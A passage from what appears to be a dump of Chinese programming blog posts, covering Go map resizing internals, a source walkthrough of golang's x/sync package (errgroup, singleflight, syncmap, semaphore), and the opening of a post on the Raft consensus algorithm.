的逻辑。下面我们就一起来看下 hashGrow 这个函数的代码，然后再看看执行过这个函数后 mapassign 的流程会有什么不同。 hashGrow 首先区分了扩容的触发原因，如果是因为有太多的溢出桶，那么会分配与原来长度相同的新的 bmap 数组，并设置 hmap.flags 的 sameSizeGrow 标记位，否则会创建原来两倍大小的 bmap 数组。然后判断 hmap.flags 是否设置过 iterator 标记位，这个标记是在 for-range 的 mapiterinit 函数中设置的，如果设置过，那么清除 iterator，只保留 oldIterator。在这之后，将新的状态更新到 hmap 中，包括新的 B、新的 flags ，更重要的，旧的 bmap 数组会被赋值给 hmap.oldbuckets 中，而 hmap.buckets 会保存新申请的 bmap 数组，虽然此时所有的键值对都在旧数组中。 hashGrow 函数执行后，hmap 结构上就有了两个 bmap 数组，在数据迁移完成之前，此时的 map 是处于“扩容中”的状态的，这使得对该 map 的读写都要有一些兼容的地方。首先来看 mapassign 函数，hashGrow 被调用后会重新执行 mapassign 的逻辑，因为 mapassign 只有新增键值对时才会触发扩容，而 hashGrow 调用后新的 bmap 数组中没有任何数据，此时如果向其中写入新的键值对，那么会对迁移操作造成影响。 那么 mapassign 在当前 map 处于“扩容中”时会做什么呢？答案是 调用growWork 函数。在调用时传递了当前的 hmap 结构以及 mapassign 要写入的 bmap 的下标，这个函数的逻辑非常简单，首先用入参的下标计算对应的扩容前的下标，然后用这个计算的下标调用了一次 evacuate 函数，然后如果当前 map 仍在扩容中，那么用 hmap.nevacuate 再调用一次 evacuate。之所以要再判断一下是否在扩容，是因为很可能第一次的 evacuate 就完成了整个 map 的扩容。 evacuate 的代码虽然比较长，但是核心逻辑也很简单，如果传递的下标对应的 bmap 链表还没有迁移，那么执行迁移，否则跳过这部分逻辑。每次调用 evacuate 时如果要迁移，那么会将入参下标对应的整个 bmap 链表迁移完，执行迁移时会区分当前是否为 sameSizeGrow，如果是的话那么直接将旧链表中所有有效的数据迁移到新链表中，然后将旧链表中的 tophash 设置为 evacuatedEmpty 或 evacuatedX；如果不是 sameSizeGrow，那么说明新的 bmap 数组的长度是旧数组的两倍，此时在迁移键值对时会计算 hash(key) &amp; 2^hmap.B 的值，由于 hmap.B 已经增加了一，那么这个与运算得到的结果会比原来的结果多一个最高位，如果这一位为 1，那么将这个键值对到 下标 + 2^(hmap.B-1) 的 bmap 链表并设置 tophash 为 evacuatedY，否则迁移到下标对应的 bmap 链表并设置 tophash 为 evacuatedX。 在 evacuate 的最后，会判断入参的下标是否与 hmap.nevacuate 相等，如果相等那么调用 advanceEvacuationMark 函数，这个函数的主要作用在于调整 hmap.nevacuate 的状态以及判断扩容是否完成。对于 hmap.nevacuate 的更新，由于 hashGrow 内部调用了两次 evacuate，第一次传递的下标是随机的，所以 hmap.nevacuate 之后可能有很多 bmap 链表已经完成迁移了，advanceEvacuationMark 每次最多会检查 1024 个链表，也就是说 hmap.nevacuate 每次最多增加 1024，实际迁移的链表数量是可能大于这个值的。而一旦 hmap.nevacuate 的值与旧 map 的长度相等，那么说明这个 map 的所有键值对都完成迁移，此时将 hmap.oldbuckets 设置为 nil，让 hmap.growing 返回 false。 以上就是 map 扩容的逻辑，现在回过头来看下读写操作对扩容的兼容。首先是 mapassign，如前所述，当决定了要写入的 bmap 链表的下标时，如果当前 map 在扩容，那么会用这个下标调用 growWork 来完成对应的旧链表的迁移。growWork 结束后，新的链表中就有了迁移后的紧凑的数据，自此 map 的扩容不会再对这个链表造成影响，所以对这个链表正常执行 mapassign 的逻辑即可。 与 mapassign 类似，mapdelete 作为另一种写操作，也会按需调用 growWork 来完成待删除键值对所在 bmap 链表的迁移，调用后也只需要正常对新链表执行 mapdelete 的逻辑，因为此后 map 的扩容不会再对这个链表造成影响。 和写操作不同，读操作并不会按需执行 growWork，所以它们对扩容的支持相对麻烦一些，首先来看 mapaccess2（mapaccess1 的逻辑与此相同，这里不在赘述），这个函数读取了 hmap.oldbuckets 是否为 nil，如果不为 nil，那么就说明当前 map 处于扩容中（与 hmap.gorwing 是一个道理），此时从 oldbuckets 中获取 hash 对应的旧的 bmap 结构，然后判断这个 bmap 是否完成迁移，如果没有完成，那么就把这个 bmap 赋值给 b 变量，此后的读逻辑就会到这个 bmap 对应的链表中查找所需的 key。 另一个读操作是 map 的遍历，具体的逻辑在 mapiternext 函数中。由于“在遍历 map 的过程中向其写入新的键值对”这个行为是不确定的，而 hmap 的扩容只会发生在 mapassign 新增键值对时，所以如果要考虑 for-range 与扩容的关系，那么正常情况下只会有 map 处于扩容中的时候对其进行 for-range，而不会有 for-range 的过程中开始扩容。对于这种情况，mapiternext 的处理与 mapaccess2 类似，如果当前遍历的 bmap 链表没有完成迁移，那么去遍历迁移前的 bmap 链表，如果已经完成迁移，那么直接遍历新的 bmap 链表。 但由于 for-range 最终会遍历整个 map，所以如果在非 sameSizeGrow 的情况下单纯用这种方式是会有问题的，因为比如扩容前有 2 个 bmap 链表，扩容后有 4 个，那么 0 和 3 都对应原来的 0 号链表，而遍历后会分别扫过 0 和 3，如果判断原来的 0 没有做迁移，那么就会遍历两次 0 号链表，最终的结果就是部分键值对会出现两次。所以，mapiternext 在遍历时以新的 bmap 数组为准，假设当前遍历的新 bmap 链表为 a，那么如果对应的旧 bmap 链表还没有迁移，就会去遍历旧链表，然后 只返回那些迁移时会被移动到 a 中的键值对，下次遍历这个旧链表时再返回剩余的部分。 另外，和新增键值对不同，修改已有的键或删除某个键是被允许的，而这虽然不会引起扩容，但是会导致迁移。也就是说，有可能两次连续调用 mapiternext 来从同一个 bmap 结构中获取两个键值对，然后在调用之间修改了 map 中的键对应的值，或是直接删除了某个键，那么很可能在第一次调用时这个 bmap 还是未迁移的状态，而第二次调用时却是已经迁移的状态了。要解决这个这个问题也很简单，因为一旦某个 bmap 被迁移，那么它的 tophash 会是 evacuatedX 或 evacuatedY，此时只需要在遍历到这种键值对时 特殊处理 即可。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"golang x/sync 包源码解读","slug":"golang-sync-package","date":"2022-12-12T11:55:52.000Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"2022/12/12/golang-sync-package/","link":"","permalink":"/2022/12/12/golang-sync-package/","excerpt":"","text":"前言golang 的 sync 和 sync/atomic 标准库中提供了很多并发编程相关的基础工具，基于这些基础工具可以向上封装一些更适用于应用场景的工具。比如 x/sync 包就提供了 errgroup、singleflight、syncmap 和 semaphore，其中 syncmap 在 go1.9 版本中已经进入了 sync 标准库中，被广泛应用在各种应用中。除此之外，我在工作中也使用过其中的 errgroup 和 singleflight。 为了更好地理解其中的原理，下面对这四种工具的源码进行解读，这篇博客假设读者已经掌握了这些工具的使用方法，如果有需要，读者可以通过点击上面的链接来查看各个工具的测试代码。 errgroup 源码：https://github.com/golang/sync/blob/master/errgroup/errgroup.go errgroup 整体而言比较简单，可以看作是 sync.WaitGroup 的升级版，所以能使用 sync.WaitGroup 的场景基本都可以用 errgroup 来代替。为了方便表述，后文将 sync.WaitGroup 均称为 wg，这也是我通常使用的该类型变量的变量名。 wg 适用于一个 goroutine 等待多个 goroutine 执行的场景，举例来说，我们作为服务端可能要给前端返回用户的详细个人信息，这些信息需要调用不同的 rpc 从不同的服务中获取，最终由请求的 handler 整合后返回。那么就可以提前生成一个响应结构，然后通过 wg 来启动多个 goroutine，每个 goroutine 负责请求不同的 rpc 并将结果填充进响应结构中，对于生成响应的 goroutine 而言只需要 wg.Wait()，当这个函数返回时就代表所有的子 goroutine 都结束执行了。 上面这个场景用代码表示的话，大概是这个样子： 1234567891011121314151617181920212223wg := new(sync.WaitGroup)wg.Add(1)go func() &#123; defer func() &#123; goRecover() wg.Done() &#125;() // do something&#125;()wg.Add(1)go func() &#123; defer func() &#123; goRecover() wg.Done() &#125;() // do something&#125;()// ...wg.Wait() 上面的代码有什么问题呢？首先，每个子 goroutine 都有一个 wg.Add(1) 和 wg.Done()，尽管可以只做一次 wg.Add(n)，但使用者需要正确地维护 wg.Add 和 wg.Done 的对应关系，如果 wg.Add 大于 wg.Done，那么 wg.Wait 就会卡死，反过来则会导致 panic；另一方面，子 goroutine 内部有可能会产生错误，但原生 wg 并不感知各个子 goroutine 是否正常结束，它甚至不感知子 goroutine 的存在；除此之外，除了 wg.Wait，各个 goroutine 并没有什么联系，原生 wg 并不能做到类似 “某个 goroutine 发生错误时就终止其他 goroutine” 的功能。 而这些在 errgroup 下都可以得到解决。errgroup 提供了一个名为 Group 的结构，该结构的定义是这样的： 123456789101112131415// A Group is a collection of goroutines working on subtasks that are part of// the same overall task.//// A zero Group is valid, has no limit on the number of active goroutines,// and does not cancel on error.type Group struct &#123; cancel func() wg sync.WaitGroup sem chan token errOnce sync.Once err error&#125; 可以看到在这个结构体中除 cancel 和 sem 外所有的字段都不是指针，而从我们后面的描述中就可以看到， 这两个字段并不是一定要有值才行。所以就像这个结构的注释一样，我们完全可以使用一个零值的 Group，因为此时强依赖的字段都已经是可使用的状态了。 和 wg 不同，Group 是感知子 goroutine 的存在的，它提供了 Go 和 TryGo 方法来做这件事。我们先看 Go 方法 ，此时先认为 cancel 和 sem 都为 nil，那么 Go 方法的定义就变得非常简单，它仅仅包装了 wg.Add(1) 和 wg.Done() 的过程，使用者此时便不再需要手动维护这两者的关系，只需要关注 func() error 内部的逻辑即可。而一旦这个作为入参的函数返回了错误，即 err 不为 nil，那么 Group 就会将这个返回的 err 赋值给内部的 err 字段。由于在赋值时使用了 errOnce，所以最终 Group.err 如果不为 nil，那么它就会是所有子 goroutine 中发生的第一个错误。 但 Group.err 的首字母是小写的，所以我们并没有办法直接访问这个变量，而是要用 Group.Wait 方法。该方法是 wg.Wait 的封装，在此基础上将 Group.err 返回，所以使用者就可以借此访问到子 goroutine 中的错误了。 到此为止，零值的 Group 已经解决了我们前面说的三个问题中的两个，那么最后一个问题要通过什么来解决呢？我们可以维护一个 channel，所有的子 goroutine 都在 select 中尝试从这个 channel 中读取或做实际的业务逻辑，一旦有某个 goroutine 遇到错误，就 close 这个 channel，那么其他的 goroutine 都会从这个 channel 中读取到内容，从而结束后序逻辑。 但是 Group 不是这样做的，它采用了 golang 中一个更接近应用场景的思维模式的工具，也就是 context。 我们前面讨论 Group 的基本功能时，是假设 cancel 和 sem 都是 nil 的。但如果 cancel 不为 nil，那么就可以做到当一个 goroutine 出错时，其他 goroutine 都提前返回的功能。Group 提供了 WithContext 方法 ，该方法调用 context.WithCancel 来包装外部传递的 ctx，并返回新的 ctx，这样这个新的 ctx 就可以以闭包的方式被 Group.Go 的入参函数所使用。 除了这些功能外，errgroup 还提供了限制并发数量的功能，该功能通过 SetLimit 方法 来实现。该方法接收一个整型数字作为最大并发度，该数字如果大于零，那么会作为 sem 这个 channel 的长度。Group.sem 的类型是 chan token，而 token 的定义是 type token struct{}。之所以要用 struct{}，是因为实际 Group 并不关注 sem 中保存的是什么，它只需要使用 sem 作为 channel 天然所拥有的阻塞能力，所以设置成 struct{} 就可以节省空间，因为该类型本身并不占用内存。errgroup 的限流采用了漏桶算法的思想，具体而言，如果 sem 不为 nil，那么 Group.Go 在执行前会尝试向 sem 写入一个 token，如果此时 sem 中保存的 token 已经达到了 Group.SetLimit 所设置的长度，那么新的写入会被阻塞直到 sem 内的某个 token 被释放。而 token 正是在 Group.done 方法 中被释放的，该方法在 Group.Go 的入参函数执行完成时就会被调用。 最后，Group 还提供了 TryGo 方法 来让使用方感知是否被限流。该方法和 Group.Go 方法的区别在于向 sem 中写入 token 的部分，通过 select-default 的方式来“浅尝辄止”：如果 g.sem &lt;- token{} 的部分不能成功，那么 select 会走到 default 的部分，并在这部分返回 false 表示因为被限流导致没能成功启动子 goroutine。 singleflight 源码：https://github.com/golang/sync/blob/master/singleflight/singleflight.go singleflight 提供了一种名为 “duplicate suppression” 的能力，这种能力非常适合用来处理缓存回源问题。举例来说，假设我们在应用中维护了一份 localcache，当用户通过发起请求来根据某个 key 获取对应的值时，应用首先在 localcache 中寻找，如果没有找到则回源到存储层中去寻找，并将找到的值或空值写回 localcache 以在下一次请求时避免回源。 在这个场景下，回源这个节点就成为了关键节点，因为当应用具备一定的并发量时，很有可能在同一时间会有多个针对同一个 key 的请求，而它们在读取 localcache 时均会发现其中没有自己需要的数据，从而进行回源，这时这些请求都会被漏放到存储层，从而使其瞬时压力升高，极端情况下可能会导致存储不可用。但实际上，这些发生在同一时间的回源请求读取存储时拿到的结果都是相同的，所以我们完全没必要将所有的请求都放到存储层。 这些不必要的回源请求，其实就是 duplicate 的，而 singleflight 要做的就是把这些不必要的请求拦截，只允许其中一个请求发生，其他请求直接读取这个请求返还的结果。 在 singleflight 包中，核心结构有如下三个： 123456789101112131415161718192021222324252627282930// call is an in-flight or completed singleflight.Do calltype call struct &#123; wg sync.WaitGroup // These fields are written once before the WaitGroup is done // and are only read after the WaitGroup is done. val interface&#123;&#125; err error // These fields are read and written with the singleflight // mutex held before the WaitGroup is done, and are read but // not written after the WaitGroup is done. dups int chans []chan&lt;- Result&#125;// Group represents a class of work and forms a namespace in// which units of work can be executed with duplicate suppression.type Group struct &#123; mu sync.Mutex // protects m m map[string]*call // lazily initialized&#125;// Result holds the results of Do, so they can be passed// on a channel.type Result struct &#123; Val interface&#123;&#125; Err error Shared bool&#125; 而这三个中，Group 又占主导位置，singleflight 提供的功能函数都要通过这个结构来调用。从代码中的注释可以看出，Group.m 是延迟初始化的，而 Group.mu 是一个值类型，所以和 errgroup.Group 相同，这个 Group 同样可以直接使用零值来完成一系列的功能。 首先，最核心的方法便是 Group.Do 方法，这个方法的一开始就通过 Group.mu 进行了加锁处理，而解锁部分有两处，分别对应两类 goroutine 进入这个方法的路径。区分这两类路径的核心在于 if c, ok := g.m[key]; ok { 这里，因为加了锁，所以这里不存在并发读的问题。如果这个 key 是第一次被使用，那么此时 g.m 中是不存在这个 key 的，所以此时会生成一个 call 结构并将其添加到 g.m 中，然后将 c.wg 通过 Add 增加 1 后调用 g.doCall 来尝试根据入参的 fn func() (interface{}, error) 获取结果。另一方面，如果这个 key 后续被其他 goroutine 使用时，前面提到的 if 就可以根据这个 key 从 g.m 中取出对应的 call，以从中直接获取结果。 我们先简单地将 doCall 理解为获取结果的方式，那么整个 singleflight 过程中有两点比较重要，首先是其他 goroutine 怎样才能知道这个 call 中的结果已经准备好了；另一方面，如果准备好了，负责 g.doCall 的 goroutine 是怎么把结果送给其他 goroutine 的。 从 Group 的定义中可以发现，Group.m 是一个 string 到 *call（指针） 的 map，这意味着不论哪个 goroutine 根据 key 从 Group.m 中拿到 call 结构都是同一个，所以任意一个 goroutine 对它的修改都能被其他 goroutine 所感知，这就解决了结果传递的问题，因为只要负责 g.doCall 的 goroutine 将结果写入 call.val 和 call.err，其他 goroutine 就可以从同一个 call 中读取这两个字段的结果。而前文所述的第一个问题也有很多解法（比如我们前面提到过的 close(channel) 的方法），不过在 singleflight 这个包中，是通过 WaitGroup 来实现的。具体而言，负责 g.doCall 的 goroutine 会对 call.wg 结构执行 Add 方法，而其他 goroutine 则对 call.wg 结构执行 Wait 方法。这样一旦 call.wg 的 Done 方法被调用，那么所有的 call.wg.Wait 都会返回，而由于 Done 是在 doCall 结束时 被调用的，所以此时其他 goroutine 就已经可以从 call.val 和 call.err 中拿到 doCall 的结果了。 同时，为了让使用者感知到是否有多个 goroutine 使用了同一个 call 结构，singleflight 在 call 中还维护了 dups 字段，该字段在 Group.Do 流程进入前文所述的 if 中时会被加一，所以只要在 Group.Do 返回时判断下 call.dups 是否大于 0 即可得知。 我个人认为 singleflight 对 WaitGroup 的应用还蛮有趣的，通常而言我对它的定位都是多个 goroutine 做 wg.Add 和 wg.Done，一个 goroutine 做 wg.Wait，而这里则是反过来的，通过多个 Wait 来实现多个 goroutine 等待一个 goroutine 的效果，这也说明了 wg.Wait 是幂等的。 和 Group.Do 方法类似，Group.DoChan 方法 也提供了 singleflight 的能力，只不过执行的结果是以 &lt;- chan Result 的方式返回的，从 Result 结构的定义可以看到，这个结构描述的其实就是 Group.Do 的返回值。所以 Group.DoChan 和 Group.Do 在原理上是基本相同的，唯一的区别在于结果的处理上，为了实现异步返回，Group.doCall 是以 goroutine 的方式来调用的，而每个请求 Group.DoChan 的 goroutine 都对应一个 &lt;- chan Result 结构，被保存在 call.chans 中，Group.doCall 会在获取到结果后依次将结果填充进 call.chans 中的每个元素中。这样 Group.DoChan 并不需要依赖 call.wg 来做 goroutine 间的结果同步，因为当 Group.doCall 结束时每个 goroutine 对应的 chan 中都能直接获取到结果。 所以由于 Group.m 这个 map 的存在，所有使用同样 key 的 goroutine 都可以从相同的 call 结构中获取到同一份结果。但是如果某个 key 一直存在于 Group.m 中，后续的所有针对这个 key 的 goroutine 都会不经过入参的 fn 的计算而直接从 call 中拿到旧的结果，这显然是不符合预期的，所以 key 一定是要被清理的。在 singleflight 中，Group.doCall 方法 会自动做 key 的清理，可以看到这里先判断了 Group.m[key] 是否是预期删除的 call，之所以这里要这样做，是因为 singleflight 还提供了 Group.Forget 方法来让使用者主动删除 Group.m 中的某个 key，而一旦这个方法被调用，紧随其后的第一个请求同一个 key 的 goroutine 就会向 Group.m 中填充新的 call 并再次调用 Group.doCall，此时 Group.m[key] 对于上一个调用 Group.doCall 的 goroutine 来说就是不该删除的了，因为现在的 call 与它毫无关系。 那么 Group.m 中某个 key 对应的 call 结构发生变化，是否会影响使用前一个 call 的那些 goroutine 们呢？答案是不会，因为它们在自己的函数栈中都创建了 c 变量，也就是上一个 call 的指针，就算其他的 goroutine 修改了 Group.m，这个 c 变量还是指向原来的 call 结构。我个人认为 singleflight 对 Group.m 的运用是非常有趣的，它在保存了旧 call 引用的同时还决定了当前的 goroutine 是否需要做 Group.doCall，非常棒。 除了删除 Group.m 中的 key，Group.doCall 主要做的就是调用入参的 fn，然后把结果填充进 call 中的 val、err、chans，这些在前面我们都已经讨论过了。除此之外，Group.doCall 还区分了 fn 内部是否发生了 panic 或 runtime.Goexit，这里做得也很巧妙，是用两个 defer 来做的，函数 最下面的代码 在 runtime.Goexit 时不会被执行，但 panic 却会执行，利用这一点就区分出了两种情况。 syncmap 源码：https://github.com/golang/sync/blob/master/syncmap/pre_go19.go 如前所述，syncmap 在 go1.9 时已经进入了标准库，所以我认为应该大多数的 gopher 都使用过这个工具。在 syncmap 中，核心的结构体有如下三个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// Map is a concurrent map with amortized-constant-time loads, stores, and deletes.// It is safe for multiple goroutines to call a Map's methods concurrently.//// The zero Map is valid and empty.//// A Map must not be copied after first use.type Map struct &#123; mu sync.Mutex // read contains the portion of the map's contents that are safe for // concurrent access (with or without mu held). // // The read field itself is always safe to load, but must only be stored with // mu held. // // Entries stored in read may be updated concurrently without mu, but updating // a previously-expunged entry requires that the entry be copied to the dirty // map and unexpunged with mu held. read atomic.Value // readOnly // dirty contains the portion of the map's contents that require mu to be // held. To ensure that the dirty map can be promoted to the read map quickly, // it also includes all of the non-expunged entries in the read map. // // Expunged entries are not stored in the dirty map. An expunged entry in the // clean map must be unexpunged and added to the dirty map before a new value // can be stored to it. // // If the dirty map is nil, the next write to the map will initialize it by // making a shallow copy of the clean map, omitting stale entries. dirty map[interface&#123;&#125;]*entry // misses counts the number of loads since the read map was last updated that // needed to lock mu to determine whether the key was present. // // Once enough misses have occurred to cover the cost of copying the dirty // map, the dirty map will be promoted to the read map (in the unamended // state) and the next store to the map will make a new dirty copy. misses int&#125;// readOnly is an immutable struct stored atomically in the Map.read field.type readOnly struct &#123; m map[interface&#123;&#125;]*entry amended bool // true if the dirty map contains some key not in m.&#125;// An entry is a slot in the map corresponding to a particular key.type entry struct &#123; // p points to the interface&#123;&#125; value stored for the entry. // // If p == nil, the entry has been deleted and m.dirty == nil. // // If p == expunged, the entry has been deleted, m.dirty != nil, and the entry // is missing from m.dirty. // // Otherwise, the entry is valid and recorded in m.read.m[key] and, if m.dirty // != nil, in m.dirty[key]. // // An entry can be deleted by atomic replacement with nil: when m.dirty is // next created, it will atomically replace nil with expunged and leave // m.dirty[key] unset. // // An entry's associated value can be updated by atomic replacement, provided // p != expunged. If p == expunged, an entry's associated value can be updated // only after first setting m.dirty[key] = e so that lookups using the dirty // map find the entry. p unsafe.Pointer // *interface&#123;&#125;&#125; 其中最核心的就是 Map 这个结构，可以看到出了 Map.dirty 外其他的字段均是值类型，所以这个结构的零值也是可以直接被使用的。在 Map 中有 read 和 dirty 两个字段，其中 read 以 atomic.Value 的方式保存 readOnly 这个结构，可以看到 readOnly 中的 m 与 dirty 一样都是 map[interface{}]*entry 类型，而这里就是最终保存 k-v 映射关系的地方。 为什么要保存两份呢？很大程度上是为了效率，如果使用得当的话，大多数的读写请求都不需要依赖 Map.mu 这个锁来完成。具体来说，readOnly.m 的读写是通过 atomic 标准库提供的 Load/Store/CompareAndSwap 来做的，虽然我没有深入研究过这些操作的实现，但由于 sync.Mutex 和 sync.RWMutex 是通过 atomic 标准库来实现的，所以 atomic 一定是比 sync 标准库中的锁要高效的。 我个人觉得 readOnly 这个名字起得不好，因为它实际上是有写操作的，但 readOnly.m 仅仅是一个普通的 map，在并发读写时如果不加锁，golang 应该会检测到并报错退出才对。事实上，对于一个新的 key 而言，readOnly.m 并不存在类似 readOnly.m[key] = val 这样直接写入的操作，只会 对已经存在的 key 做更新操作，而这种操作并不会命中 golang map 的并发检测。对于那些新的 key，写入操作都只会发生在 dirty 中，所以在读取时如果 readOnly.m 中没有找到，就需要 到 dirty 中去尝试寻找。但是如果 readOnly.m 中没有需要的 key，也不是一定要去 dirty 中读取，这是通过 readOnly.amended 来实现的，当且仅当 dirty 中拥有 readOnly.m 中不存在的 key 时，这个字段才为 true。 通过阅读操作 dirty 的代码就会发现，它真的就只是一个普通的 map，而且存在向其中新增 key 的情况，这就不可避免地要在读写时进行加锁（也就是 Map.mu），而相较于使用 atomic 的 readOnly.m，这就变得非常低效了。所以 dirty 会在一定情况下升级为 readOnly.m，这是通过 Map.misssLocked 函数 来做的，在这个函数中会先增加 Map.misses 字段的值（函数被调用前加了锁，所以不会有并发增加的现象），当该字段的值大于等于 dirty 的长度时，就会执行升级操作。而这个函数只会在读取 dirty 时才会被调用，这样整体看来，就是每次读操作从 readOnly.m 穿透到 dirty 时就会算做一次 miss，而 miss 的次数大于等于 dirty 的长度时，就会将 dirty 升级为 readOnly，升级后的读操作相较于之前就会有所好转，因为新的 readOnly 拥有比之前更多的数据。 回到 readOnly.m 上，这个结构会经历的操作就只有读、更新以及替换整个 map，但是 Map.missLocked 函数在做完 readOnly 的升级后就 将 dirty 设置为 nil，那么当使用者继续向 dirty 中添加新的 key 时，dirty 中不就只有这些新添加的 key 了吗？如果读取这些新的 key 使 miss 达到阈值后发生升级，那么 readOnly 中原来的 key 不就消失了？事实上，当使用者 向值为 nil 的 dirty 中添加新的 key 时（也就是 readOnly.amended 为 false），会调用 Map.dirtyLocked 函数。可以发现，这个函数从 readOnly 中复制了所有值不为 nil 和 expunged 的 k-v（这里先不管这两种值的含义，后面讨论删除时会提到），所以此时 dirty 既包含 readOnly.m 中 “有效” 的 k-v，也包含新的 k-v，这样在升级时就不会丢失曾经的 key 了。同时，而由于 readOnly.m 和 dirty 中的值都是指针，所以实际上它们是共享同一份内存的，这一方面减小了空间开销，一方面又保证了一处的修改在另一处也能感知。 我们再来看看删除操作，也就是 Map.Delete 函数。这个函数的思路比较简单，如果 readOnly.m 中没有要删除的 key 而 readOnly.amended 为 true，那么 dirty 中就 “可能” 有要删除的 key，但是具体有没有，syncmap 并不关心，它直接就对 dirty 使用了 delete(m.dirty, key)，但这没有什么问题，因为用 delete 尝试从 map 中删除一个不存在 key 并不会报错。而如果 readOnly.m 中存在要被删除的 key，那么就会将其标记为 nil，这个 nil 在 dirty 被初始化时会在 readOnly.m 中 被替换成 expunged，而且不会出现在被初始化的 dirty 中。所以正如 注释 中所描述的，nil 和 expunged 都表示某个 key 被删除，如果 readOnly.m 中被删除的 key 表示为 nil，那么说明此时 dirty 为 nil，如果被删除的 key 表示为 expunged，那么 dirty 就不为 nil（不过如果硬要说的话，其实 这里 在e.unexpungeLocked 结束后 e.storeLocked 执行前对应的 key 就是 nil，此时 dirty 也不为 nil，不过只是一瞬间 :-P）。 所以对于删除这个操作而言，如果被删除的 key 在 readOnly.m 中可以被找到，那么这个删除其实是惰性的，它仅仅只是将 key 对应的值设置为 nil，直到 dirty 发生升级时，readOnly.m 整个被不存在这个 key 的 dirty 替换掉，这个删除才真正发生。在此之前，key 实际是存在于 readOnly.m 中的，只是读取时会 忽略那些值为 nil 或 expunged 的 key，营造出这个 key 不存在的假象。这在多数情况下不会有什么问题，但如果 key 是很占内存的类型，那这个删除也许并不符合应用的预期。 除了读写和删除外，syncmap 还支持 LoadOrStore、Range 等操作，原理和前面描述的差不多，其中 Range 操作除了提供遍历功能外，还能够 加速 dirty 到 readOnly.m 的升级，即只要 readOnly.amended 为 true，也就是 dirty 中存在 readOnly 中不存在的 key 时，就会做 dirty 的升级操作，而不管 Map.miss 是否达到阈值。 总的来说，syncmap 还是适合多读少写的场景，进一步的，如果是更新原值的写操作也没什么，但如果存在大量的新增 key 的写操作，那 syncmap 的性能其实并不高，因为这些新的 key 都会被放在 dirty 中，而读写 dirty 是要加锁的。除此之外，频繁地增加新的 key 还可能引发多次 dirty 的升级，而每次升级后再增加新的 key 时，都会发生新 dirty 的初始化，这会产生 O(n) 的复杂度，在 k-v 数量很多的情况下会进一步影响应用的性能。 semaphore 源码：https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/semaphore/semaphore.go semaphore 这个工具我本人并没有使用过，但因为它也被包含在 sync 包中，所以就一起研究下。这个包的代码相较于前面几个而言比较简单，核心的结构体有如下两个： 12345678910111213// Weighted provides a way to bound concurrent access to a resource.// The callers can request access with a given weight.type Weighted struct &#123; size int64 cur int64 mu sync.Mutex waiters list.List&#125;type waiter struct &#123; n int64 ready chan&lt;- struct&#123;&#125; // Closed when semaphore acquired.&#125; 其中功能函数都是由 Weighted 这个结构来使用的，和前面的三个工具不同，尽管 Weighted 是可导出的，但功能上要求 Weighted.size 字段的值是大于零的，而 size 是不可导出的，所以使用者需要调用 NewWeighted 方法 来创建 Weighted 类型的变量。 从源码来看，semaphore 想要做的是通过 Weighted 声明可以使用的最大资源量，提供 Weighted.Acquire 方法来获取定量的资源，如果目前没有足够量的资源，那么当前的 goroutine 会以上文 waiter 结构的形式被添加到一个链表里，当有可用资源时，这个 goroutine 就会被唤醒；而之所以会有可用的资源，是因为有些 goroutine 释放了之前申请的资源，这是通过 Weighted.Release 方法来做的。除此之外，该包还提供了 Weighted.TryAcquire 用于无阻塞地申请资源，这个方法和 Weighted.Acquire 的区别在于，当没有足够量的资源时这个函数会立即返回 false 表示资源获取失败，而不是将当前 goroutine 加入到 waiters 链表中。 为了做到有资源时唤醒 goroutine，每个 waiter 结构都有一个名为 ready 的只写的 channel，我没有看出这里设置成只写是有什么意义，因为 实际使用时 用的还是一个双向的 channel，当 goroutine 获取不到所需的资源量时，会使用 select 来从这个 channel 中尝试读取数据，以此实现阻塞。而当某个 goroutine 调用 Weighted.Release 释放资源时，会调用 Weighted.notifyWaiters 方法，按顺序遍历 waiters 链表中的各个 waiter，如果某个 waiter 所需的资源量已经可以获取到了，那么就调用 close(waiter.ready) ，这样对应的 goroutine 中的 select 就会结束，以此实现唤醒。 semaphore 的核心逻辑到此为止就结束了，但我们还能从中发掘一些其他的信息。首先是如果调用 Weighted.Acquire 时传递了一个比 Weighted.n（即资源的总量）还大的数字，那么 当前 goroutine 就会陷入阻塞，直到 &lt;-ctx.Done() 返回。但这就对 ctx 有了要求，它不能是 ctx.TODO() 或 ctx.Background()，因为这两个 ctx 的 Done 方法会返回一个 nil，而尝试从一个为 nil 的 channel 中读取数据会导致当前 goroutine 永远陷入阻塞。 另一方面，Weighted.waiters 是一个链表，而 Weighted.notifyWaiters 方法在被调用时会按序遍历这个链表尝试唤醒，遇到第一个不能唤醒的 goroutine 时，这个函数就退出了。这会导致什么问题呢？比如目前可用的资源量是 5，waiters 链表中各个 waiter 的 n 依次是 6, 1, 1, 1，实际上这个链表中的后三个 goroutine 都是可以被唤醒的，但因为第一个 goroutine 需要的资源量是 6，就导致后续的 goroutine 不会被扫描。关于这部分，注释中给出的解释是为了效率，因为 semaphore 中使用的链表操作的时间复杂度都是 O(1) 的，而如果使用小顶堆这类的结构，虽然可以尽可能唤醒那些被阻塞的 goroutine，但增删的时间复杂度是不及链表的。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 Raft 一致性算法","slug":"Raft","date":"2022-07-31T13:40:14.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/07/31/Raft/","link":"","permalink":"/2022/07/31/Raft/","excerpt":"","text":"论文下载 前言2014年，一个名为 Raft 的算法被提出，这是一个以易于理解和方便实现为目的一致性算法。作者在同一年分别发表了名为 《In Search of an Understandable Consensus Algorithm》的论文，以及它的 Extended Version，较为详细地描述了 Raft。除此之外，作者的博士论文则以一个更详细的表述方式来描述了 Raft 的各个特性，所以 2014 年的版本被后人称为“ Raft 小论文”，本文就是小论文的阅读笔记与一些思考。 Raft 要解决什么问题在讨论 Raft 的特性前，我认为明确它要解决的问题是更重要的。首先，Raft 是一个一致性算法，这类算法服务于分布式场景，试图在集群中的成员间就某件事情达成一致。导致不一致的原因会有很多，较为常见的就是 CAP 中的 P，也就是网络分区。 举例来说，单 Leader 多 Follwer 的模式被很多分布式系统所采用，Follwer 多数负责分摊读取的流量，Leader 则负责写入。基于这个假设，底层存储的设计会变得简单，因为它只需要考虑来自一台机器的写流量即可。但是一旦 Leader 与 Follwer 